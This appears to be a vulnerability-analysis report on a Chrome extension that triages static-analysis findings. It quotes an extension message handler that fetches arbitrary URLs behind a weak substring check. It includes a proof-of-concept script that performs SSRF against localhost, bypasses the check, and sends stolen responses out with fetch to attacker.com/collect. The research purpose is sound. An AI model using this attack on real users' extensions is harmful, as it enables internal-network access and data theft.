# CoCo Analysis: nkkbbhjgjifpbockgfpflchdboolmdmm

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 5 (XMLHttpRequest_responseText_source → chrome_storage_sync_set_sink x2, bg_external_port_onMessage → XMLHttpRequest_url_sink x2, XMLHttpRequest_responseText_source → bg_external_port_postMessage_sink x1)

---

## Sink 1 & 2: XMLHttpRequest_responseText_source → chrome_storage_sync_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/nkkbbhjgjifpbockgfpflchdboolmdmm/opgen_generated_files/bg.js
Line 332: XMLHttpRequest.prototype.responseText = 'sensitive_responseText';
Line 1577: langPack = JSON.parse(data);

**Classification:** FALSE POSITIVE

**Reason:** CoCo flagged framework mock code (Line 332 is CoCo's mock XHR response, not actual extension code). In the real extension code, the extension fetches language packs from its own infrastructure and stores them. This is internal functionality, not attacker-controlled.

---

## Sink 3 & 4: bg_external_port_onMessage → XMLHttpRequest_url_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/nkkbbhjgjifpbockgfpflchdboolmdmm/opgen_generated_files/bg.js
Line 1767: requestXHTML(msg.url, function (data) {
Line 1011: if (url.indexOf("api.mazii.net") != -1) {

**Code:**

```javascript
// Background script (bg.js)
chrome.runtime.onConnectExternal.addListener(function(port) { // ← External connection listener
    port.onMessage.addListener(function(msg, sender, sendResponse) { // ← attacker-controlled
        if (msg.request == "requestUrl") {
            requestXHTML(msg.url, function (data) { // ← attacker-controlled URL
                data = JSON.parse(data);
                port.postMessage({ result: data, requestUrl: msg.url });
            });
        }
    });
});

function requestXHTML(url, successCallback) {
    try {
        var xhr = new XMLHttpRequest();

        xhr.onload = function() {
            if (xhr.responseText) {
                if (successCallback) {
                    successCallback(xhr.responseText);
                }
            }
        }

        xhr.onerror = function(error) {
        }

        if (url.indexOf("api.mazii.net") != -1) { // ← Weak validation
            xhr.open("POST", url, true);
            xhr.send(null);
        } else {
            xhr.open("GET", url, true);
            xhr.send(null);
        }

    } catch (e) {
        //console.error(e);
    }
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** chrome.runtime.onConnectExternal - allows external extensions to connect

**Attack:**

```javascript
// From malicious extension (must be in externally_connectable matches: *://*.mazii.net/*)
var port = chrome.runtime.connect('nkkbbhjgjifpbockgfpflchdboolmdmm');

// SSRF Attack - bypass CORS to access internal resources
port.postMessage({
  request: 'requestUrl',
  url: 'http://localhost:8080/admin' // ← attacker-controlled URL
});

// Or exploit the weak validation:
port.postMessage({
  request: 'requestUrl',
  url: 'http://attacker.com/malicious?api.mazii.net' // ← Contains "api.mazii.net" in query string
});

port.onMessage.addListener(function(response) {
  console.log('Stolen data:', response.result);
  // Exfiltrate the response
  fetch('https://attacker.com/collect', {
    method: 'POST',
    body: JSON.stringify(response.result)
  });
});
```

**Impact:** Server-Side Request Forgery (SSRF) vulnerability. External attacker from mazii.net domain can:
1. Make arbitrary HTTP GET requests from the extension context, bypassing CORS
2. Access internal/private network resources (localhost, 192.168.x.x, etc.)
3. The weak validation (checking if URL contains "api.mazii.net") can be bypassed by including it in query parameters or fragments
4. Retrieve and exfiltrate the response data back through the port

---

## Sink 5: XMLHttpRequest_responseText_source → bg_external_port_postMessage_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/nkkbbhjgjifpbockgfpflchdboolmdmm/opgen_generated_files/bg.js
Line 332: XMLHttpRequest.prototype.responseText = 'sensitive_responseText';
Line 1768: data = JSON.parse(data);

**Classification:** TRUE POSITIVE

**Reason:** This is part of the same flow as Sink 3 & 4. The attacker-controlled URL's response is sent back through the external port, allowing data exfiltration. Covered in the comprehensive attack above.
